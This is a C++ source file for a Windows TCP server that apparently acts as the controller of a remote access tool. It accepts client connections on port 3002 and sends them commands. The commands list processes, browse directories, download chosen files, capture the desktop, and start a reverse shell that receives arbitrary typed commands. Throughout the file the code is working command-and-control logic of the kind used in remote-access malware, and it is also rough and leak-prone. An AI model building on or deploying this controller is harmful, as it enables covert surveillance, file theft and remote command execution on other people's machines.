#include "NetServerService.h"
#include "../../../shared/ConcurrentLib/core/Thread.h"
// #include "../../concurrent/events/net/NewConnectionEvent.h"
#include "../../../shared/ConcurrentLib//core/Mutex.h"
#include "../../concurrent/events/ServerAppEvent.h"
#include "../../concurrent/events/ClientAppEvent.h"
#include "../../../shared/NetLib/packets/PacketPresentation.h"
#include "../../models/Client.h"
#include "../../../shared/NetLib/packets/PacketProcess.h"
#include "../../../shared/NetLib/packets/PacketFileSystem.h"

#include "../../concurrent/events/net/ClientNetEvent.h"
#include <iostream>
#include "../../../shared/NetLib/packets/PacketDownload.h"
#include "../../../shared/NetLib/packets/PacketMediaResponse.h"
#include "../../../shared/NetLib/packets/PacketShell.h"


typedef struct ClientThreadArg
{
	NetServerService* master;
	SOCKET hSocket;
	std::shared_ptr<NetClientService> client;
}* LPNET_CLIENT_THREAD_ARG;


DWORD WINAPI listenPacketsToBeSentThreadFunc(LPVOID threadArg)
{
	auto netServerService = static_cast<NetServerService*>(threadArg);
	netServerService->loopPacketsQueue();
	return 0;
}

DWORD WINAPI listenAppNetEventsThreadFunc(LPVOID threadArg)
{
	auto netServerService = static_cast<NetServerService*>(threadArg);
	netServerService->loopAppEvents();
	return 0;
}


NetServerService::NetServerService(const NetAppDoubleQueueThreadChannel& channel)
	: netEventChannel(channel)
{
	clientsMutex = new Mutex("clientsMutex");
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_addr.s_addr = htonl(INADDR_ANY);
	// clientAddr.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
	// clientAddr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
	serverAddr.sin_port = htons(3002);
}


NetServerService::~NetServerService()
{
	// TODO: work this better, there may be race issues
	UUID* uuid;
	for (auto const& client : clients)
	{
		// uuid = client.second->getUuid();
		// uuidService->freeUuid(uuid);
	}
}


void NetServerService::start()
{
	appEventsThread = new Thread(static_cast<LPTHREAD_START_ROUTINE>(listenAppNetEventsThreadFunc),
	                             static_cast<PVOID>(this));
	appEventsThread->run();

	startSendPacketsLoopAsync();
	listenForClients();
}

// Launch a thread looping trough a queue of Events coming from Application
void NetServerService::startSendPacketsLoopAsync()
{
	packetSendThread = new Thread(static_cast<LPTHREAD_START_ROUTINE>(listenPacketsToBeSentThreadFunc),
	                              static_cast<PVOID>(this));
	packetSendThread->run();
}


void NetServerService::listenForClients()
{
	ServerAppEvent* netEvent = new ServerAppEvent(ServerEventType::ServerStatusChange,
	                                              "[+] Creating server ...");

	if (createTCPServer(port) == INVALID_SOCKET)
	{
		NetEvent* netEvent = new NetEvent(ServerStatusChange, "Error creating TCP Server");
		// netEventChannel.sendToApp(netEvent);
		// outNetEventsQueue.push(netEvent);
	}

	netEventChannel.sendToApp(netEvent);

	ADDRINFOA addr;
	running = true;
	int clientAddrLen = sizeof(struct sockaddr_in);

	netEvent = new ServerAppEvent(ServerEventType::ServerStatusChange, "[+] Server socket accepting clients");
	netEventChannel.sendToApp(netEvent);
	// outNetEventsQueue.push(netEvent);

	while (running)
	{
		SOCKET clientSocket = accept(socketDescriptor, (SOCKADDR*)&addr, &clientAddrLen);

		if (clientSocket == INVALID_SOCKET)
		{
			NetError error;
			getErrorOnConnect(error);
			// netEventChannel.sendToApp(new NetEvent(ServerError, error.messageChar.c_str()));
			// outNetEventsQueue.push(new NetEvent(ServerError, error.messageChar.c_str()));
			return;
		}
		else
		{
			// boost::uuids::uuid uuid = uuidGenerator();
			// std::lock_guard<std::mutex> lock(clientsMutex);
			clientsMutex->lock();


			//auto client = std::make_shared<NetClientService>(this, clientSocket);
			UUID* uuid = UuidService::generateUUID();
			NetClientService* client = new NetClientService(uuid, this, clientSocket);

			client->setSocketDescriptor(clientSocket);
			std::pair<SOCKET, NetClientService*> clientPair = std::make_pair(clientSocket, client);
			clients.insert(clientPair);

#if MANUAL_MEM_MANAGEMENT
#endif
			clientsMutex->unlock();
			client->interactAsync();

			// TODO: Get remote Ip and send it
			ServerAppEvent* event = new ServerAppEvent(ServerEventType::ServerStatusChange, "[+] New connection");
			netEventChannel.sendToApp(event);
		}
	}
}


SOCKET NetServerService::createTCPServer(unsigned short port)
{
	int iResult;

	ADDRINFOA addr;

	hostent* addrResolved;
	SOCKET s;

	// setRunning(true);


	ZeroMemory(&addr, sizeof(ADDRINFOA));

	addr.ai_family = AF_INET;
	addr.ai_socktype = SOCK_STREAM;
	addr.ai_protocol = IPPROTO_IP;
	addr.ai_flags = AI_PASSIVE; // msdn : The clientSocket address will be used in a call to the bind function.

	// iResult = getaddrinfo(NULL, (std::to_string(port)).c_str(), &addr, &ultimate);
	iResult = 0;
	if (iResult != 0)
	{
		// printf("Failure on getaddrinfo with error %d\n", iResult);
		WSACleanup();
		return 1;
	}

	s = socket(addr.ai_family, addr.ai_socktype, addr.ai_protocol);
	setSocketDescriptor(s);
	if (s == INVALID_SOCKET)
	{
		// printf("Failure in clientSocket() %d\n", WSAGetLastError());
		// freeaddrinfo(ultimate);
		NetError* err = getErrorOnSocketCreate();
		netEventChannel.sendToApp(new AppEvent(Target::Server, Subject::InvalidSubject, err->messageChar.c_str()));
		// outNetEventsQueue.push(new NetEvent(ServerError, err->messageChar.c_str()));
		delete err;
		WSACleanup();
		return 1;
	}
	int yes = 1;
	iResult = setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (char*)&yes, sizeof(int));
	if (iResult != 0)
	{
		// printf("error on setsockopt() %d", iResult);
		// freeaddrinfo(ultimate);
		closesocket(s);
		WSACleanup();
		return 1;
	}

	//I should to find use of gethostbyname
	//addrResolved = gethostbyname(hostname.c_str());
	//addrResolved->h_name;

	iResult = ::bind(s, (sockaddr*)&serverAddr, sizeof(SOCKADDR));


	if (iResult == SOCKET_ERROR)
	{
		// printf("error on bind() %d", WSAGetLastError());
		// freeaddrinfo(ultimate);
		NetError* err = getErrorOnBind();
		// netEventChannel.sendToApp(new NetEvent(ServerError, err->messageChar.c_str()));
		// outNetEventsQueue.push(new NetEvent(ServerError, err->messageChar.c_str()));
		delete err;
		closesocket(s);
		WSACleanup();
		return 1;
	}

	// freeaddrinfo(ultimate);
	iResult = listen(s, SOMAXCONN);
	return s;
}


/*
// std::shared_ptr<NetClientService> NetServerService::getClientByUuid(UUID* uuid)
NetClientService* NetServerService::getClientByUuid(UUID* uuid)
{
	for (std::vector<int>::size_type i = 0; i != clients.size(); i++)
	{
		// std::vector<std::shared_ptr<NetClientService>>::value_type client = clients[i];
		auto client = clients[i];
		if (client->getUuid() == uuid)
			return client;
	}

	return nullptr;
}
*/
void NetServerService::loopPacketsQueue()
{
	Packet* packet;
	SOCKET uuid;
	// std::shared_ptr<NetClientService> client;
	NetClientService* client;

	running = true;
	while (running)
	{
		// TODO: how to handle locking?
		/*clientsMutex->lock();
		packet = packetsToBeSent.front();
		uuid = packet->getDestination();
		client = getClientByUuid(uuid);
		client->sendPacket(packet);
		clientsMutex->unlock();
		*/


		std::unique_lock<std::mutex> lock(outPacketsMutex);
		if (packetsToBeSent.size() > 0)
		{
			packet = packetsToBeSent.front();
			uuid = packet->getDestination();
			client = clients[uuid];
			client->sendPacket(packet);
		}
		else
		{
			cv.notify_one();
			cv.wait(lock);
			packet = packetsToBeSent.front();
			uuid = packet->getDestination();
			client = clients[uuid];
			client->sendPacket(packet);
		}
		packetsToBeSent.pop();
	}
}

void NetServerService::sendPacketAsync(Packet* packet)
{
	// TODO: there may be hang issues if this is called from the main thread and lock
	// takes too long too own it
	// clientsMutex->lock();
	// packetsToBeSent.push(packet);
	// clientsMutex->unlock();

	std::unique_lock<std::mutex> lock(outPacketsMutex);
	packetsToBeSent.push(packet);
	cv.notify_one(); // Notify worker
	cv.wait(lock);
}

void NetServerService::onError(NetError* appError)
{
	// netEventChannel.sendToApp(new AppEvent(ClientError, appError->messageChar.c_str()));
}

std::map<SOCKET, NetClientService*> NetServerService::getClientsMap()
{
	return clients;
}

std::vector<Client*> NetServerService::getClients()
{
	std::vector<Client*> clientsVector;
	for (auto&& clientPair : clients)
	{
		Client* client = clientPair.second->getClient();
		clientsVector.push_back(client);
	}
	return clientsVector;
}

std::vector<NetClientService*>::size_type NetServerService::getClientsCount() const
{
	return clients.size();
}

void NetServerService::onPacketReceived(Client* client, Packet* packet)
{
	char uuidBuffer[256];
	UuidService::getStringFromUuid(client->getUuid(), uuidBuffer);
	switch (packet->getType())
	{
	case PacketType::Presentation:
		{
			auto presentationPacket = (PacketPresentation*)packet;
			auto clientNetEvent = new ClientAppEvent(Subject::Connection, Action::Start, client);
			netEventChannel.sendToApp(clientNetEvent);
			delete packet;
			break;
		}
	case PacketType::ProcessList:
		{
			const auto packetProcess = (PacketProcess*)packet;
			auto* processes = new std::vector<Process>(packetProcess->processes);
			const auto event = new ClientAppEvent(Subject::Process, Action::Update, client, processes);
			netEventChannel.sendToApp(event);
			delete packet;
			break;
		}
	case PacketType::Camera: //Packet Type: chat message
		break;
	case PacketType::FileSystem:
		{
			const auto event = new ClientAppEvent(Subject::PacketReceived, client, packet);
			netEventChannel.sendToApp(event);
			break;
		}
	case PacketType::Download:
		{
			const auto event = new ClientAppEvent(Subject::Download, client, packet);
			netEventChannel.sendToApp(event);
			break;
		}
	case PacketType::Desktop:
		{
			const auto event = new ClientAppEvent(Subject::PacketReceived, client, packet);
			netEventChannel.sendToApp(event);
			break;
		}
	case PacketType::ReverseShell:
		{
			const auto event = new ClientAppEvent(Subject::PacketReceived, client, packet);
			netEventChannel.sendToApp(event);
			break;
		}
	default:
		std::cout << "Not handled packet type NetServerService::onPacketReceived()" << std::endl;
		break;
	}
}

void NetServerService::onClientDisconnected(Client* client)
{
	UUID* clientId = client->getUuid();
	SOCKET socketDescriptor = client->getSocketDescriptor();
	if (clients.find(socketDescriptor) != clients.end())
	{
		NetClientService* netClient = clients[socketDescriptor];
		clients.erase(socketDescriptor);
		delete netClient;
	}
}

Client* NetServerService::getClient(unsigned long long clientId)
{
	NetClientService* netClient = clients[clientId];
	if (netClient == nullptr)
		return nullptr;

	return netClient->getClient();
}

void NetServerService::loopAppEvents()
{
	running = true; // set it to true, otherwise we may have a race condition
	while (running)
	{
		AppEvent* event = netEventChannel.takeFromApp();

		if (event == nullptr)
			continue;
		if (event->target == Target::Server)
		{
			switch (event->subject)
			{
			case Subject::Connection:
				{
					if (event->action == Action::ListAvailable)
					{
						std::vector<Client*>* clients = new std::vector<Client*>(getClients());
						AppEvent* clientAppEvent =
							new AppEvent(Target::Server, Subject::Connection, Action::ListAvailable, clients);

						netEventChannel.sendToApp(clientAppEvent);
					}
					break;
				}
			default:
				break;
			}
		}
		else if (event->target == Target::Client)
		{
			ClientAppEvent* clientAppEvent = (ClientAppEvent*)event;

			if (event->subject == Subject::Interaction)
			{
				if (event->action == Action::Start)
				{
					Client* client = getClient(clientAppEvent->clientId);

					if (client == nullptr)
					{
						netEventChannel.sendToApp(new AppEvent(
							Target::Ui, Subject::Error,
							"The client does not exist"));
					}
					else
						netEventChannel.sendToApp(new ClientAppEvent(Subject::Interaction, Action::Start, client));

					continue;
				}
			}

			// For other subjects we know we have a Client* in ClientAppEvent, get it
			Client* client = clientAppEvent->getClient();
			const unsigned long long clientId = client->getId();
			if (event->subject == Subject::Process)
			{
				if (event->action == Action::Start)
				{
					if (client != nullptr)
					{
						if (clients.find(client->getId()) != clients.end())
						{
							PacketProcess* packet = new PacketProcess();
							queuePacket(packet, client->getId());
						}
					}
				}
			}
			else if (event->subject == Subject::FileSystem)
			{
				if (event->action == Action::Start)
				{
					if (clients.find(clientId) != clients.end())
					{
						auto packet = new PacketFileSystem;
						const auto pathToRetrieve = static_cast<std::wstring*>(clientAppEvent->object);
						packet->path = *pathToRetrieve;
						queuePacket(packet, clientId);
						delete static_cast<std::wstring*>(clientAppEvent->object);
						clientAppEvent->object = nullptr;
					}
				}
			}
			else if (event->subject == Subject::Download)
			{
				auto packet = new PacketDownload;
				const auto filePath = (std::wstring*)clientAppEvent->object;
				packet->filePath = *filePath;
				queuePacket(packet, clientId);
				delete filePath;
				clientAppEvent->object = nullptr;
			}
			else if (event->subject == Subject::Desktop)
			{
				if (event->action == Action::Start)
				{
					const auto packet = new PacketMediaResponse(PacketType::Desktop);
					queuePacket(packet, clientId);
				}
			}
			else if (event->subject == Subject::ReverseShell)
			{
				if (event->action == Action::Start)
				{
					const auto packet = new PacketShell();
					packet->action = PacketShellAction::Start;
					queuePacket(packet, clientId);
				}
				else if (event->action == Action::Update)
				{
					const auto packet = new PacketShell();
					packet->action = PacketShellAction::PushCommand;

					const auto command = (std::string*)clientAppEvent->object;
					packet->data = *command; // copy string to packet->data

					// Append new line if not present already
					if (packet->data.at(packet->data.size() - 1) != '\n')
						packet->data.append("\n");

					queuePacket(packet, clientId);
					delete command;
					clientAppEvent->object = nullptr;
				}
			}
		}
		// We are done with the Event, delete it
		delete event;
	}
}

void NetServerService::queuePacket(Packet* packet, unsigned long long clientId)
{
	packet->setDestination(clientId);
	std::unique_lock<std::mutex> lk(outPacketsMutex);
	packetsToBeSent.push(packet);
	cv.notify_one(); // Notify worker
	// cv.wait(lk);
}

NetError* NetServerService::getErrorOnBind()
{
	int errCode = WSAGetLastError();
	NetError* err = new NetError;
	err->errorCode = errCode;
	if (errCode == WSANOTINITIALISED)
		err->messageChar.append("A successful WSAStartup must occur before using this function.");
	else if (errCode == WSAENETDOWN)
		err->messageChar.append("The network subsystem has failed.");
	else if (errCode == WSAEADDRINUSE)
	{
		err->messageChar.append("A process on the machine is already bound to the same\n");
		err->messageChar.append("fully-qualified address and the socket has not been marked\n");
		err->messageChar.append("to allow address re-use with SO_REUSEADDR. For example,\n");
		err->messageChar.append("IP address and port are bound in the af_inet case");
	}
	else if (errCode == WSAEADDRNOTAVAIL)
		err->messageChar.append("The specified address is not a valid address for this machine.");
	else if (errCode == WSAEFAULT)
	{
		err->messageChar.append("The name or the namelen parameter is not a valid part of\n");
		err->messageChar.append("the user address space, the namelen parameter is too small,\n");
		err->messageChar.append("the name parameter contains incorrect address format for the\n");
		err->messageChar.append("associated address family, or the first two bytes of the memory\n");
		err->messageChar.append("block specified by name does not match the address family\n");
		err->messageChar.append("associated with the socket descriptor s.");
	}
	else if (errCode == WSAEINPROGRESS)
	{
		err->messageChar.append("A blocking Windows Sockets 1.1 call is in progress, or the\n");
		err->messageChar.append("service provider is still processing a callback function.");
	}
	else if (errCode == WSAEINVAL)
		err->messageChar.append("The socket is already bound to an address. ");
	else if (errCode == WSAENOBUFS)
		err->messageChar.append("Not enough buffers available, too many connections.");
	else if (errCode == WSAENOTSOCK)
		err->messageChar.append("The descriptor is not a socket.");
	else err->messageChar.append("unknown problems!");
	return err;
}

/*
 *
 *	/* case FileSystem:
			std::string FileName; //string to store file name
			if (!GetString(ID, FileName)) //If issue getting file name
				return false; //Failure to process packetType
	
			connections[ID]->file.infileStream.open(FileName, std::ios::binary | std::ios::ate);
			//Open file to read in binary | ate mode. We use ate so we can use tellg to get file size. We use binary because we need to read bytes as raw data
			if (!connections[ID]->file.infileStream.is_open()) //If file is not open? (Error opening file?)
			{
				std::cout << "Client: " << ID << " requested file: " << FileName << ", but that file does not exist." <<
					std::endl;
				return true;
			}
	
			connections[ID]->file.fileName = FileName;
			//set file name just so we can print it out after done transferring
			connections[ID]->file.fileSize = connections[ID]->file.infileStream.tellg(); //Get file size
			connections[ID]->file.infileStream.seekg(0);
			//Set cursor position in file back to offset 0 for when we read file
			connections[ID]->file.fileOffset = 0; //Update file offset for knowing when we hit end of file
	
			if (!HandleSendFile(ID)) //Attempt to send byte buffer from file. If failure...
				return false;
			
void NetServerService::OnClientDisconnected(boost::uuids::uuid uuid)
{
	std::lock_guard<std::mutex> lock(clientsMutex);
	clients[uuid]->packetDispatcher.Clear();
	clients[uuid]->CloseAllConnections();
	closesocket(clients[uuid]->clientSocket);
}
*/
